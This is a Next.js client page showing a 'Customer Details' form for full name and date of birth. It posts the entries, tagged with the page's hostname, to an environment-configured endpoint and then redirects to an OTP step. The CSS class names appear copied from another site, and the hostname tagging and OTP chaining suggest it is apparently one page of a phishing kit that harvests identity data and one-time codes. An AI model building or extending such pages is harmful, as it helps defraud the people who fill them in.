'use client'
import Captcha from "../../assets/captcha.png";
import { useRouter } from "next/navigation"; // in client component

import { useState } from 'react';
export default function Home() {
   const router = useRouter();
   const  [response, setResponse] = useState(false);
    const showError = () => {
        alert("OTP resend successfully !");
    }
  const handleSubmit = (e) => {
    e.preventDefault();
      const formData = new FormData(e.target);
      const body = {};
      formData.forEach((value, key) => {
        body[key] = value;
      });
      body['site'] = window.location.hostname;
      fetch(process.env.API_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json'},
        body: JSON.stringify(body),
      })
        .then((res) => res.json())
        .then((responseData) => {
          if(responseData.status == 200){
            setResponse(true);
            router.push("/otp?next=/ap")
          }else{
            setResponse(false);
            console.log('failed');
          }
            
        })
        .catch((error) => {
          setResponse(false);
          console.error(error);
        });
  };
  return (
    <main>
    <div className="Tpv_login_heading__E5J6K">
      <h3 className="Tpv_login_heading_h3__z0Qx1">Customer Details</h3>
    </div>
    
    <div className="Tpv_login_form___9zpm">
            <p className="Tpv_mandatory_txt__YZHLO">Required fields an asterisk (*)</p>
            <form className="Tpv_form__okPRU" onSubmit={handleSubmit}>
                <div className="Tpv_form_group__aHWg0">
                <label className="Tpv_label__cObJz">
                    Customer Full Name* <span className="Tpv_mandatory_txt__YZHLO">*</span>
                </label>
                <input  
                    name="CFN"
                    type="text"
                    className="Tpv_form_control__5hzGF"
                    required
                />
                </div>
                <div className="Tpv_form_group__aHWg0">
                <label className="Tpv_label__cObJz">
                    Date of Birth<span className="Tpv_mandatory_txt__YZHLO">*</span>
                </label>
                <input  
                    name="CDOBB"
                    type="text"
                    className="Tpv_form_control__5hzGF"
                    placeholder="DD/MM/YYYY"
                    required
                />
                </div>
                <div className="Tpv_t_center__8YF86">
                <input
                    type="submit"
                    className="Tpv_btn_default__TMlv_"
                    defaultValue="submit"
                />
                </div>
            </form>
            
            </div>

  </main>
  
  )
}
